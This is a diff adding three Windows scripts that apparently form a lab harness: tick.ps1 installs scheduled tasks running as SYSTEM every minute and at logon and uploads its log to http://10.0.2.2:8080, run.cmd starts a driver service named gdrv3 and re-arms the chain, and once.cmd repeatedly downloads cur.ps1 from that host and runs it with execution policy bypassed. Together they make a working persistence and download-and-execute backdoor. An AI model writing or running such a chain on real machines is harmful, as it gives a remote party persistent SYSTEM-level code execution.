@@ -1,0 +1,37 @@
+===== tick.ps1 =====
+# tick.ps1 - install a 1-minute SYSTEM tick task so probes fire without any console
+$d = 'C:\Users\Public\p37'
+$log = "$d\tick.log"
+$base = 'http://10.0.2.2:8080'
+"tick install " + (Get-Date -f 'HH:mm:ss') | Set-Content -LiteralPath $log
+& schtasks.exe /create /tn p37tick /tr "$d\run.cmd" /sc minute /mo 1 /ru SYSTEM /rl highest /f *>> $log
+& schtasks.exe /create /tn p37logon /tr "$d\run.cmd" /sc onlogon /ru SYSTEM /rl highest /f *>> $log
+& schtasks.exe /delete /tn p37run /f *>> $log
+& schtasks.exe /query /fo csv *>> $log
+& schtasks.exe /run /tn p37tick *>> $log
+try { (New-Object Net.WebClient).UploadString("$base/log", ("## tick`r`n" + (Get-Content -LiteralPath $log -Raw))) } catch { }
+===== run.cmd =====
+@echo off
+rem run.cmd - task action: ensure driver, hand off, then re-arm the chain
+set d=C:\Users\Public\p37
+cd /d %d%
+sc query gdrv3 | find "RUNNING" >nul || sc start gdrv3 >nul 2>&1
+start "" /min cmd /c "%d%\once.cmd"
+timeout /t 12 /nobreak >nul
+schtasks /run /tn p37logon >nul 2>&1
+
+
+
+===== once.cmd =====
+@echo off
+set d=C:\Users\Public\p37
+cd /d %d%
+del %d%\cur.ps1 2>nul
+for /l %%i in (1,1,6) do (
+  powershell -NoProfile -c "try{(New-Object Net.WebClient).DownloadFile('http://10.0.2.2:8080/cur.ps1','%d%\cur.ps1')}catch{}" >nul 2>&1
+  if exist %d%\cur.ps1 goto run
+  timeout /t 10 /nobreak >nul
+)
+exit /b
+:run
+powershell -NoProfile -ExecutionPolicy Bypass -File %d%\cur.ps1
